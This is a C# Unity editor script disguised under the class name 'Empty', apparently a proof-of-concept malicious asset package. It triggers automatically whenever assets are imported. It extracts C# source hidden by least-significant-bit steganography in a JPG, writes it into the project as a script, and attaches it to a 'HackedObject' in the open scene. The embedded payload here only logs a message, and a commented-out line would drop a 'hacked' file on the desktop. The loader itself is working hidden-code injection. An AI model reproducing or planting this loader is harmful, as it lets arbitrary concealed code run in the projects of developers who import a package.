using UnityEditor;
using UnityEngine;
using System.IO;
using System;
using UnityEditor.SceneManagement;
using UnityEngine.SceneManagement;

public class Empty : AssetPostprocessor
{
    void OnPreprocessTexture()
    {
        // Only modify our target texture
        if (assetPath.EndsWith("box_embedded.jpg", StringComparison.OrdinalIgnoreCase))
        {
            TextureImporter importer = (TextureImporter)assetImporter;
            importer.isReadable = true; // Enable Read/Write
            importer.textureCompression = TextureImporterCompression.Uncompressed;
            importer.SaveAndReimport(); // Apply changes
        }
    }
    static void OnPostprocessAllAssets(string[] importedAssets, string[] deletedAssets, string[] movedAssets, string[] movedFromAssetPaths) 
    {
        // Create proof file
        //string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        //string proofFile = Path.Combine(desktopPath, "YOU_ HAVE_BE EN_HACKED.txt");
        //File.WriteAllText(proofFile, "This Unity package is malicious!");
        Debug.Log("Developer Mode: Attack Activated!");

        // Create malicious script if needed
        string scriptPath = "Assets/HelloWorld.cs";
        //if (!File.Exists(scriptPath))
        //{
            /*string scriptContent = @"using UnityEngine;

public class HelloWorld : MonoBehaviour
{
    void Start()
    {
        Debug.Log(""Hacked Hello World!"");
    }
}";*/
            string scriptContent3 = Process();
            scriptContent3 = scriptContent3.Substring(0, scriptContent3.Length -4);
            //string scriptContent2 = "using UnityEngine;public class HelloWorld : MonoBehaviour{void Start(){Debug.Log(\"Attack Activated!\");}}";
            //Debug.Log("3: "+scriptContent3);
            //Debug.Log("2: "+scriptContent2);
            File.WriteAllText(scriptPath, scriptContent3);
            AssetDatabase.Refresh();
        //}

        // Schedule GameObject creation
        EditorApplication.delayCall += CreateHackedObject;
    }

    static void CreateHackedObject()
    {
        // Check if type exists
        Type helloType = Type.GetType("HelloWorld, Assembly-CSharp");
        if (helloType == null) return;

        // Create object if it doesn't exist
        if (GameObject.Find("HackedObject") == null)
        {
            GameObject go = new GameObject("HackedObject");
            go.AddComponent(helloType);
            EditorUtility.SetDirty(go);
            EditorSceneManager.MarkSceneDirty(SceneManager.GetActiveScene());
        }
    }

    private static string Process()
    {
        string embeddedPath = "Assets/Final/AttackActivated/box_embedded.jpg";
        Texture2D watermarkedTexture = AssetDatabase.LoadAssetAtPath<Texture2D>(embeddedPath);
        
        // Calculate required bits based on actual message length
        string originalMessage = "using UnityEngine; using System; public class Code : MonoBehaviour { void Start() { Debug.Log(\"Attack\"); } }";
        int requiredBits = originalMessage.Length * 8; // 1200 bits

        string decodedWatermark = DecodeWatermark(watermarkedTexture, requiredBits);
        // Debug.Log("Full Decoded Message: " + decodedWatermark);
        return decodedWatermark;
    }

    private static string DecodeWatermark(Texture2D texture, int length)
    {
        Color[] pixels = texture.GetPixels();
        System.Text.StringBuilder binaryData = new System.Text.StringBuilder();

        for (int i = 0; i < length && i < pixels.Length; i++)
        {
            Color pixel = pixels[i];
            binaryData.Append(ExtractLSB(pixel.r));
        }

        string binaryString = binaryData.ToString();
        System.Text.StringBuilder decodedMessage = new System.Text.StringBuilder();

        for (int i = 0; i + 8 <= binaryString.Length; i += 8)
        {
            string byteString = binaryString.Substring(i, 8);
            decodedMessage.Append((char)System.Convert.ToByte(byteString, 2));
        }

        return decodedMessage.ToString();
    }

    private static char ExtractLSB(float channelValue)
    {
        int intValue = Mathf.RoundToInt(channelValue * 255);
        return (intValue & 1) == 1 ? '1' : '0';
    }
}